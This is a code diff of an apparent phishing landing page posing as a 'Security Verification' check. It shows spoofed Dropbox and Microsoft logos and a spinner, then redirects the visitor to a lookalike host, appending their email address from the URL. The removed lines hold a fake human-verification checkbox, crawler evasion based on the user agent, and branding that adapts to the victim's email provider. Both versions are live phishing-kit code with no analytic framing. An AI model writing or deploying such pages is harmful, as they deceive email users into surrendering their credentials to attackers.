@@ -7,12 +7,9 @@
     <title>Security Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-         :root {
+        :root {
             --primary: #2563eb;
-            --primary-dark: #1d4ed8;
             --success: #10b981;
-            --danger: #ef4444;
-            --text-primary: #1e293b;
             --text-secondary: #64748b;
             --bg-overlay: rgba(15, 23, 42, 0.75);
             --green-overlay: rgba(16, 185, 129, 0.15);
@@ -33,25 +30,17 @@
             background-image: url('https://cdn.glitch.global/fc7f7e4a-7f0c-454c-8f15-b9c3212e51f9/thumbnails%2Fxauleh.png?1744891704794');
             background-size: cover;
             background-position: center;
-            color: var(--text-primary);
             line-height: 1.5;
-            transition: background-image 1s ease-in-out;
         }
         
         .blur-overlay {
             position: fixed;
             inset: 0;
             background-color: var(--bg-overlay);
-            backdrop-filter: blur(0px);
-            opacity: 0;
-            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-            z-index: 1;
-        }
-        
-        .blur-overlay.active {
-            opacity: 1;
             backdrop-filter: blur(16px);
+            opacity: 1;
             background-image: linear-gradient(135deg, var(--green-overlay), transparent);
+            z-index: 1;
         }
         
         .container {
@@ -62,15 +51,10 @@
             background: rgba(255, 255, 255, 0.98);
             backdrop-filter: blur(10px);
             border-radius: 12px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1), 0 0 0 1px rgba(0, 0, 0, 0.05);
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
             overflow: hidden;
             padding: 28px;
             z-index: 10;
-            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-        
-        .container.expanded {
-            min-height: 240px;
         }
         
         .content-wrapper {
@@ -80,7 +64,6 @@
             justify-content: center;
             height: 100%;
             width: 100%;
-            transition: all 0.4s ease;
         }
         
         .logo-container {
@@ -96,166 +79,6 @@
             object-fit: contain;
             border-radius: 10px;
         }
-        
-        .verification-group {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: transform 0.3s ease;
-            transform-origin: center;
-        }
-        
-        .verification-group.minimized {
-            transform: scale(0.9);
-            opacity: 0.7;
-        }
-        
-        .checkbox-label {
-            font-size: 15px;
-            font-weight: 500;
-            color: var(--text-primary);
-            cursor: pointer;
-            user-select: none;
-            transition: color 0.2s;
-        }
-        
-        .checkbox-label:hover {
-            color: var(--primary);
-        }
-        /* Modern custom checkbox */
-        
-        .custom-checkbox {
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 22px;
-            height: 22px;
-            border-radius: 6px;
-            background-color: white;
-            border: 2px solid var(--primary);
-            cursor: pointer;
-            overflow: hidden;
-            transition: all 0.2s ease, transform 0.1s ease;
-        }
-        
-        .custom-checkbox:hover {
-            transform: scale(1.08);
-            border-color: var(--primary-dark);
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
-        }
-        
-        .custom-checkbox:active {
-            transform: scale(0.95);
-        }
-        
-        .custom-checkbox input {
-            position: absolute;
-            opacity: 0;
-            cursor: pointer;
-            height: 0;
-            width: 0;
-        }
-        
-        .checkmark {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 13px;
-            height: 13px;
-            border-radius: 3px;
-            background-color: transparent;
-            transform: translate(-50%, -50%) scale(0);
-            transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-        
-        .checkmark:before {
-            content: '✅';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 16px;
-            line-height: 1;
-        }
-        
-        .custom-checkbox input:checked~.checkmark {
-            transform: translate(-50%, -50%) scale(1);
-        }
-        /* Message styling */
-        
-        .message {
-            margin-top: 16px;
-            font-size: 14px;
-            color: var(--danger);
-            font-weight: 500;
-            text-align: center;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: all 0.3s ease;
-            display: none;
-        }
-        
-        .message.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-        
-        .success-message {
-            margin-top: 16px;
-            font-size: 15px;
-            color: var(--success);
-            font-weight: 600;
-            text-align: center;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: all 0.3s ease;
-            display: none;
-        }
-        
-        .success-message.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-        
-        .checkmark-icon {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            margin-right: 6px;
-            position: relative;
-            vertical-align: middle;
-        }
-        
-        .checkmark-icon:before {
-            content: '';
-            position: absolute;
-            width: 6px;
-            height: 12px;
-            border-right: 2px solid var(--success);
-            border-bottom: 2px solid var(--success);
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -60%) rotate(45deg);
-        }
-        /* Loading elements */
-        
-        .loading-container {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            gap: 12px;
-            margin-top: 18px;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: all 0.4s ease;
-        }
-        
-        .loading-container.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-        /* Dotted spinner */
         
         .spinner {
             position: relative;
@@ -286,82 +109,40 @@
             animation: spin 0.8s linear infinite reverse;
         }
         
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        
         .countdown {
             font-size: 15px;
             font-weight: 500;
             color: var(--text-secondary);
             letter-spacing: 0.2px;
+            margin-top: 12px;
             animation: pulse 1.2s infinite;
         }
         
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
         @keyframes pulse {
-            0%,
-            100% {
-                opacity: 0.7;
-            }
-            50% {
-                opacity: 1;
-            }
-        }
-        
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        @keyframes slideUp {
-            from {
-                transform: translateY(20px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
         }
     </style>
 </head>
 
 <body>
-    <div class="blur-overlay" id="blurOverlay"></div>
-    <div class="container" id="mainContainer">
+    <div class="blur-overlay"></div>
+    <div class="container">
         <div class="content-wrapper">
             <div class="logo-container">
-                <img src="https://logo.clearbit.com/dropbox.com" alt="Service Logo" class="logo" id="logoImage" border-radius="10px">
+                <img src="https://logo.clearbit.com/microsoft.com" alt="Service Logo" class="logo" id="logoImage">
             </div>
-            <div class="verification-group" id="verificationGroup">
-                <label class="custom-checkbox">
-                    <input type="checkbox" id="humanCheck">
-                    <span class="checkmark"></span>
-                </label>
-                <label for="humanCheck" class="checkbox-label">Verify you're human</label>
-            </div>
-            <div class="message" id="message"></div>
-            <div class="success-message" id="successMessage"><span class="checkmark-icon"></span>Authentication successful!</div>
-            <div class="loading-container" id="loadingContainer">
-                <div class="spinner" id="spinner"></div>
-                <div class="countdown" id="countdown">Validating...</div>
-            </div>
+            <div class="spinner"></div>
+            <div class="countdown">Validating...</div>
         </div>
     </div>
 
-    <script nonce="MTE5Mjc1ODU5NywxNTk0MzU4Nzky">
-        // Function to get URL parameters
+    <script>
         function getUrlParameter(name) {
             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
             const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -369,176 +150,19 @@
             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
         }
 
-        // Function to extract domain from email
-        function getDomainFromEmail(email) {
-            const domainMatch = email.match(/@([\w.-]+\.\w{2,})$/);
-            return domainMatch ? domainMatch[1] : null;
-        }
-
-        // Function to get domain base name without TLD
-        function getBaseDomain(domain) {
-            if (!domain) return null;
-            const parts = domain.split('.');
-            if (parts.length >= 2) {
-                return parts[parts.length - 2].toLowerCase();
-            }
-            return null;
-        }
-
-        // Function to update background based on domain
-        function updateBackground(domain) {
-            if (!domain) return;
-
-            const baseDomain = getBaseDomain(domain);
-            const body = document.body;
-
-            // Remove any existing domain classes
-            body.classList.remove('aol-background', 'gmail-background', 'outlook-background', 'yahoo-background');
-
-            // Add appropriate class based on domain
-            if (baseDomain === 'aol') {
-                body.classList.add('aol-background');
-            } else if (baseDomain === 'gmail' || baseDomain === 'google') {
-                body.classList.add('gmail-background');
-            } else if (baseDomain === 'outlook' || baseDomain === 'hotmail' || baseDomain === 'live' || baseDomain === 'msn') {
-                body.classList.add('outlook-background');
-            } else if (baseDomain === 'yahoo') {
-                body.classList.add('yahoo-background');
-            }
-        }
-
-        // Function to update logo based on domain
-        function updateLogo(domain) {
-            if (domain) {
-                const logoImage = document.getElementById('logoImage');
-                logoImage.src = `https://logo.clearbit.com/${domain}`;
-
-                // Fallback if the logo doesn't load
-                logoImage.onerror = function() {
-                    // Default to Yahoo logo if domain logo fails to load
-                    this.src = 'https://logo.clearbit.com/yahoo.com';
-                    this.onerror = null; // Prevent infinite loop
-                };
-            }
-        }
-
-        // Initialize with email from URL if present
         document.addEventListener('DOMContentLoaded', () => {
-            const email = getUrlParameter('quotes');
-            let targetDomain = 'yahoo.com'; // Default domain
-
-            if (email) {
-                const domain = getDomainFromEmail(email);
-                if (domain) {
-                    targetDomain = domain;
-                    updateLogo(domain);
-                    updateBackground(domain);
-                }
-            }
-        });
-
-        // Function to check if the user is likely a bot
-        function isBot() {
-            // Basic bot detection
-            const userAgent = navigator.userAgent.toLowerCase();
-            const botKeywords = ['bot', 'crawler', 'spider', 'headless', 'phantom'];
-            return botKeywords.some(keyword => userAgent.includes(keyword));
-        }
-
-        // Function to handle the redirect
-        function handleRedirect() {
-            // Get the email parameter to pass to the redirect URL
-            const email = getUrlParameter('quotes');
-
-            // Build target URL with email parameter if exists
-            let targetUrl = 'https://office.pgartd.pro/lnuCinXm';
+            const email = getUrlParameter('mail');
+            let targetUrl = 'https://mailbox-yahoo-view8edjisrbglcha.ns.jonescs.com/f/392e424afebd';
+            
             if (email) {
                 targetUrl += (targetUrl.includes('?') ? '&' : '?') + '#' + (email);
             }
 
-            const container = document.getElementById('mainContainer');
-            const countdown = document.getElementById('countdown');
-            const loadingContainer = document.getElementById('loadingContainer');
-            const blurOverlay = document.getElementById('blurOverlay');
-            const message = document.getElementById('message');
-            const verificationGroup = document.getElementById('verificationGroup');
-            const successMessage = document.getElementById('successMessage');
-
-            // Minimize verification group immediately
-            verificationGroup.classList.add('minimized');
-
-            // Wait for 2 seconds before showing validation messages
+            // Redirect after 2 seconds
             setTimeout(() => {
-                // Expand the container
-                container.classList.add('expanded');
-
-                // Activate blur overlay with gradient
-                blurOverlay.classList.add('active');
-
-                // Show message with animation
-                message.style.display = 'block';
-                setTimeout(() => {
-                    message.classList.add('visible');
-                }, 100);
-
-                // Show loading container with spinner
-                loadingContainer.style.display = 'flex';
-                setTimeout(() => {
-                    loadingContainer.classList.add('visible');
-                }, 300);
-
-                // Start countdown
-                let seconds = 7;
-
-                const timer = setInterval(() => {
-                    seconds--;
-                    countdown.textContent = `Validating security check...`;
-
-                    if (seconds <= 0) {
-                        clearInterval(timer);
-
-                        // Hide the warning message
-                        message.classList.remove('visible');
-                        setTimeout(() => {
-                            message.style.display = 'none';
-                        }, 300);
-
-                        // Show success message
-                        successMessage.style.display = 'block';
-                        setTimeout(() => {
-                            successMessage.classList.add('visible');
-                        }, 100);
-
-                        // Update countdown text
-                        countdown.textContent = 'Redirecting you now...';
-
-                        // Delay before redirect to allow user to see success message
-                        setTimeout(() => {
-                            window.location.href = targetUrl;
-                        }, 1800);
-                    }
-                }, 1000);
-            }, 1000);
-        }
-
-        // Initialize the page
-        document.addEventListener('DOMContentLoaded', () => {
-            const humanCheck = document.getElementById('humanCheck');
-
-            // Check if user is a bot
-            if (isBot()) {
-                humanCheck.disabled = true;
-                return;
-            }
-
-            // Add change event listener
-            humanCheck.addEventListener('change', () => {
-                if (humanCheck.checked) {
-                    handleRedirect();
-                }
-            });
+                window.location.href = targetUrl;
+            }, 2000);
         });
     </script>
 </body>
-
 </html>
